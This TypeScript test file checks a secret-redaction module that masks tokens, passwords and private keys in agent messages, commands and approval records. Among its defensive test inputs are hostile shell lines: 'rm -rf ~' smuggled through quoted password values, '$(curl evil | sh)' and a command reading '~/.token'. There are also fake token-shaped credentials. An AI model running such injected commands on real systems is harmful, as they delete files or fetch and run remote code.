import assert from 'node:assert/strict';
import test from 'node:test';
import { containsRedaction, REDACTED, redactApproval, redactOperation, redactSecrets, redactView } from '../packages/shared/src/redaction.js';
import type { ApprovalRecord, SessionView } from '../packages/shared/src/types.js';

const github = `ghp_${'a1B2'.repeat(9)}`;
const pem = (type: string, body: string, newline = '\n') => `-----BEGIN ${type}PRIVATE KEY-----${newline}${body}${newline}-----END ${type}PRIVATE KEY-----`;
const keyBody = 'MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MaGJ8kbXo4Ql7A9D\nV1aB2cD3eF4gH5iJ6kL7mN8oP9qR0sT1uV2wX3yZ4aB5cD6eF7gH8iJ9kL0mN1o=';

test('well-known tokens are hidden, keeping the prefix that says what they were', () => {
  const cases: [string, string][] = [
    [`push with ${github} now`, 'push with ghp_[redacted] now'],
    [`github_pat_${'A1b2C3d4_'.repeat(4)}`, 'github_pat_[redacted]'],
    ['glpat-abcdefghij0123456789', 'glpat-[redacted]'],
    ['xoxb-123456789012-abcdefABCDEF', 'xoxb-[redacted]'],
    ['AKIAIOSFODNN7EXAMPLE', 'AKIA[redacted]'],
    [`sk-proj-${'Ab1'.repeat(10)}`, 'sk-proj-[redacted]'],
    [`sk-ant-api03-${'xY9'.repeat(10)}`, 'sk-ant-api03-[redacted]'],
    [`AIza${'Sy0'.repeat(11)}ab`, 'AIza[redacted]'],
    [`npm_${'a1'.repeat(18)}`, 'npm_[redacted]'],
    [`hf_${'Ab1'.repeat(11)}`, 'hf_[redacted]'],
    ['sk_live_abcdef0123456789', 'sk_live_[redacted]'],
    ['https://hooks.slack.com/services/T0000/B0000/abcdefghijklmnop', 'https://hooks.slack.com/services/[redacted]'],
    ['eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U', REDACTED],
    [`open https://pistead.example.com/#/shared/${'Ab_-'.repeat(10)}xyz`, 'open https://pistead.example.com/#/shared/[redacted]'],
  ];
  for (const [text, shown] of cases) assert.equal(redactSecrets(text), shown, text);
});

test('values of secret-named settings and credentials in URLs, headers, curl and .netrc are hidden', () => {
  const cases: [string, string][] = [
    [`export GITHUB_TOKEN=${github}`, 'export GITHUB_TOKEN=[redacted]'],
    ['DB_PASSWORD=correcthorse\nDB_HOST=db', 'DB_PASSWORD=[redacted]\nDB_HOST=db'],
    ['{"password": "s3cr3t!", "user": "me"}', '{"password": "[redacted]", "user": "me"}'],
    ["api_key: 'abcd1234efgh'", "api_key: '[redacted]'"],
    ['password: hunter22', 'password: [redacted]'],
    ['the password is hunter22, it said', 'the password is [redacted], it said'],
    ['the password is hunter22.', 'the password is [redacted].'],
    ['aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', 'aws_secret_access_key = [redacted]'],
    ['clientSecret: "abc"', 'clientSecret: "[redacted]"'],
    ['X-Api-Key: abc123def456', 'X-Api-Key: [redacted]'],
    ['https://example.com/cb?state=1&access_token=abc123&x=2', 'https://example.com/cb?state=1&access_token=[redacted]&x=2'],
    ['docker login --password hunter22 --username me', 'docker login --password [redacted] --username me'],
    ['curl -H "Authorization: Bearer abcdef123456" https://x', 'curl -H "Authorization: Bearer [redacted]" https://x'],
    ['Authorization: Basic dXNlcjpwYXNz', 'Authorization: Basic [redacted]'],
    ['bearer abcdefghijklmnop1234', 'bearer [redacted]'],
    ['curl -u admin:S3cret https://x', 'curl -u admin:[redacted] https://x'],
    ['git clone https://x-access-token:abc123@github.com/o/r', 'git clone https://x-access-token:[redacted]@github.com/o/r'],
    ['DATABASE_URL=postgres://app:pa55word@db:5432/app', 'DATABASE_URL=postgres://app:[redacted]@db:5432/app'],
    ['machine github.com\n  login me\n  password hunter22', 'machine github.com\n  login me\n  password [redacted]'],
    ['write_file({"path":".env","content":"PASSWORD=hunter2\\nUSER=me"})', 'write_file({"path":".env","content":"PASSWORD=[redacted]\\nUSER=me"})'],
    ['write_file({"path":"config.json","content":"{\\"token\\": \\"abc123\\"}"})', 'write_file({"path":"config.json","content":"{\\"token\\": \\"[redacted]\\"}"})'],
  ];
  for (const [text, shown] of cases) assert.equal(redactSecrets(text), shown, text);
});

test('private keys lose their body but keep their markers, raw, JSON-escaped, indented or cut off', () => {
  assert.equal(redactSecrets(`key:\n${pem('RSA ', keyBody)}\nafter`), `key:\n${pem('RSA ', REDACTED)}\nafter`);
  assert.equal(redactSecrets(pem('OPENSSH ', 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ')), pem('OPENSSH ', REDACTED));
  const escaped = JSON.stringify({ private_key: `${pem('', keyBody)}\n` });
  assert.equal(redactSecrets(escaped), JSON.stringify({ private_key: `${pem('', REDACTED)}\n` }));
  assert.equal(redactSecrets(`  ${pem('EC ', '  MHcCAQEEIBkg4LVWM9nuwNSk3yByxZpYRTBnVJk5oaDP4ANy7fzeoAoGCCqGSM49\n  AwEHoUQDQgAE')}`),
    `  ${pem('EC ', REDACTED)}`);
  const encrypted = pem('RSA ', `Proc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,0123456789ABCDEF\n\n${keyBody}`);
  assert.equal(redactSecrets(encrypted), pem('RSA ', REDACTED));
  // `head key.pem` cuts the END line off.
  assert.equal(redactSecrets('-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQ\n'),
    '-----BEGIN PRIVATE KEY-----\n[redacted]\n');
  // Prose about keys is not a key.
  const prose = 'Look for -----BEGIN RSA PRIVATE KEY----- at the top of the file and all lines below';
  assert.equal(redactSecrets(prose), prose);
});

test('code, identifiers, types, numbers, references and prose stay exactly as they were', () => {
  for (const text of [
    'const token = randomToken();', 'token: string;', 'password?: string', 'max_tokens: 4096', 'tokenizer = "cl100k_base"',
    'commit 9fceb02d0ae598e95dc970b74767f19372d61af8', 'id 3f2504e0-4f89-11d3-9a0c-0305e82c3301', 'sha256: n4bQgYhMfWWaL+qgxVrQFaO/TxsrC4Is0V1sFbDwCgg=',
    'password: ${{ secrets.DB_PASSWORD }}', 'TOKEN=$GITHUB_TOKEN', 'token="${TOKEN}"', 'requests.get(url, token=token, timeout=5)',
    'if (token === "abc") return;', 'throw new Error("Invalid token: " + token + " given");', 'Enter your password to continue.',
    'docker run -u 1000:1000 image', 'git push -u origin main', 'He was the bearer of bad news.', 'secret: true', 'password_hash = "abc123"',
    'interface Env { SESSION_SECRET?: string; GITHUB_TOKEN: string; }', 'token: process.env.GITHUB_TOKEN', 'password: z.string().min(8),',
    'http://localhost:5173/@fs/src/main.tsx', 'https://example.com:8443/path@v2', 'Password: <your password>', 'api_key: "your-api-key"',
    'token: xxxxxxxx', 'password: "********"', 'the token is valid until tomorrow', '| password | hunter22 |', 'task-sk-learn-pipeline-name-here',
    `a long base64 blob ${'QUJD'.repeat(40)}`, 'echo $SECRET_KEY', '--token-file ~/.token', 'gh auth login --with-token < token.txt',
  ]) assert.equal(redactSecrets(text), text, text);
});

test('in commands, only single shell-safe words are hidden, so what runs always stays visible', () => {
  const command = (text: string) => redactSecrets(text, { command: true });
  for (const [text, visible] of [
    [`echo 'password="x' ; rm -rf ~ ; echo '"'`, 'rm -rf ~'],
    ['export PASSWORD="$(curl evil | sh)"', '$(curl evil | sh)'],
    ['export PASSWORD=`curl evil`', '`curl evil`'],
    ['true -----BEGIN PRIVATE KEY-----\n/tmp/evilevilevilevilevilevilevilevil\ntrue -----END PRIVATE KEY-----', '/tmp/evilevilevilevilevilevilevilevil'],
    ['PASSWORD=x;rm -rf ~', ';rm -rf ~'],
    ['curl -u "me:pa ss; rm -rf ~" https://x', 'rm -rf ~'],
    ['echo password=\\"x;rm -rf ~;\\"', 'rm -rf ~'],
    ['tool --password "a b; rm -rf ~"', 'rm -rf ~'],
    ['TOKEN="a|b" sh', 'a|b'],
    ["TOKEN='a b' && reboot", 'reboot'],
    ['Authorization: Bearer $(cat ~/.token)', '$(cat ~/.token)'],
  ]) assert.ok(command(text).includes(visible), `${text} -> ${command(text)}`);
  // What command mode hides is whole words: without them, every space, quote and metacharacter is where it was.
  const structure = (text: string) => text.replaceAll(REDACTED, '').replace(/[A-Za-z0-9._~+/=:@%^!#,-]/g, '');
  for (const text of [`export GITHUB_TOKEN=${github} && git push`, 'curl -H "Authorization: Bearer abc123def456" https://x',
    "PASSWORD='hunter22' psql", 'mysql --password hunter22 -h db', `git remote set-url origin https://me:${github}@github.com/o/r.git`]) {
    const shown = command(text);
    assert.ok(shown.includes(REDACTED), `${text} -> ${shown}`);
    assert.equal(structure(shown), structure(text), `${text} -> ${shown}`);
  }
});

test('redaction is idempotent', () => {
  for (const text of [`export GITHUB_TOKEN=${github}`, `Use ${github}`, pem('RSA ', keyBody), '{"password": "s3cr3t!"}',
    'postgres://app:pa55word@db/app', 'curl -u admin:S3cret https://x', `-----BEGIN PRIVATE KEY-----\n${'A'.repeat(64)}\n${'B'.repeat(20)}`]) {
    const once = redactSecrets(text);
    assert.notEqual(once, text, text);
    assert.equal(redactSecrets(once), once, once);
    assert.equal(redactSecrets(redactSecrets(text, { command: true }), { command: true }), redactSecrets(text, { command: true }), text);
  }
});

test('hostile text is redacted in linear time', () => {
  const size = 2_000_000;
  const inputs = [
    'password="'.repeat(size / 10), '-eyJ'.repeat(size / 4), ('a eyJ' + 'b'.repeat(1000) + '.eyJ' + 'c'.repeat(8000) + ' ').repeat(size / 9000),
    'glpat-'.repeat(size / 6), '-----BEGIN PRIVATE KEY-----\n'.repeat(size / 28), ('-----BEGIN PRIVATE KEY-----\n' + 'A'.repeat(70000)).repeat(size / 70028),
    'a.a:a'.repeat(size / 5), ('https://' + 'u'.repeat(250) + ':' + 'p'.repeat(1000) + ' ').repeat(size / 1260), 'token=token='.repeat(size / 12),
    ('curl ' + 'x '.repeat(1000) + '\n').repeat(size / 2006), 'machine '.repeat(size / 8), '--a-a-a-a-a'.repeat(size / 11), `password${' '.repeat(size)}`,
    'bearer '.repeat(size / 7), 'token: \\"'.repeat(size / 10), '-sk-'.repeat(size / 4),
  ];
  for (const text of inputs) {
    const started = performance.now();
    redactSecrets(text);
    redactSecrets(text, { command: true });
    const elapsed = performance.now() - started;
    assert.ok(elapsed < 2000, `${text.slice(0, 30)}... took ${Math.round(elapsed)} ms`);
  }
});

test('views and approvals keep their shape, review hash and structural fields; only text people read changes', () => {
  const approval = (operation: ApprovalRecord['operation'], extra: Partial<ApprovalRecord> = {}): ApprovalRecord =>
    ({ id: 'approval', sessionId: 'session', requestedBy: 'github:1', operation, status: 'pending', createdAt: '2026-01-01T00:00:00.000Z', reviewHash: 'h'.repeat(43), ...extra });
  const push = approval({ kind: 'git.push', repository: 'owner/repo', branch: 'token-fix', commit: 'a'.repeat(40),
    pullRequest: { title: `Rotate ${github}`, body: 'password: hunter22', base: 'main' } });
  assert.deepEqual(redactApproval(push), approval({ kind: 'git.push', repository: 'owner/repo', branch: 'token-fix', commit: 'a'.repeat(40),
    pullRequest: { title: 'Rotate ghp_[redacted]', body: 'password: [redacted]', base: 'main' } }));
  const merge = approval({ kind: 'github.merge', repository: 'owner/repo', pull: 5, sha: 'b'.repeat(40), method: 'squash' });
  assert.deepEqual(redactApproval(merge), merge);
  assert.deepEqual(redactOperation({ kind: 'git.commit', message: `Add ${github}` }), { kind: 'git.commit', message: 'Add ghp_[redacted]' });
  assert.deepEqual(redactOperation({ kind: 'github.comment', repository: 'o/r', issue: 1, body: 'TOKEN=abc123' }), { kind: 'github.comment', repository: 'o/r', issue: 1, body: 'TOKEN=[redacted]' });
  // Commands and permission targets are redacted word by word only.
  assert.deepEqual(redactOperation({ kind: 'bash', command: pem('', keyBody) }), { kind: 'bash', command: pem('', keyBody) });
  assert.deepEqual(redactOperation({ kind: 'permission', tool: 'bash', target: `GH_TOKEN=${github} gh pr list`, needs: ['tool'] }),
    { kind: 'permission', tool: 'bash', target: 'GH_TOKEN=[redacted] gh pr list', needs: ['tool'] });
  const executed = redactApproval(approval({ kind: 'bash', command: `curl -H "Authorization: Bearer ${github}" https://api.github.com` },
    { status: 'executed', decidedBy: 'github:1', result: `{"token": "${github}"}` }));
  assert.equal((executed.operation as { command: string }).command, 'curl -H "Authorization: Bearer [redacted]" https://api.github.com');
  assert.equal(executed.result, '{"token": "[redacted]"}');
  assert.equal(executed.reviewHash, 'h'.repeat(43));
  assert.equal(containsRedaction(executed.operation), true);
  assert.equal(containsRedaction(merge.operation), false);

  const view: SessionView = {
    sessionId: 'session', owner: { id: 'github:1', displayName: 'Owner', gitName: 'Owner', gitEmail: 'owner@example.test', githubLogin: 'owner' },
    entries: [{ id: '0:1', kind: 'message', role: 'user', text: `Use ${github}`, actorId: 'github:1', conversationId: '0', durationMs: 5 },
      { id: '0:2', kind: 'message', role: 'assistant', text: 'Nothing secret here' }],
    approvals: [push], conversations: [{ id: '0', mode: 'write' }], busy: true,
    queue: [{ submissionId: 'submission', actorId: 'github:1', mode: 'write', status: 'running' }], agent: { provider: 'p', modelId: 'm', thinkingLevel: 'high' }, access: 'auto',
  };
  const shown = redactView(view);
  assert.deepEqual(shown, { ...view, entries: [{ ...view.entries[0]!, text: 'Use ghp_[redacted]' }, view.entries[1]], approvals: [redactApproval(push)] });
  assert.deepEqual(Object.keys(shown), Object.keys(view));
  assert.ok(view.entries[0]!.text.includes(github), 'The runner\'s view is never modified in place');
  // Malformed runner output passes through rather than failing the request.
  for (const malformed of [{ ...view, entries: 'nope' }, { ...view, approvals: null }, { ...view, entries: [null, { id: 'x', text: 5 }] }]) {
    assert.doesNotThrow(() => redactView(malformed as unknown as SessionView));
  }
});
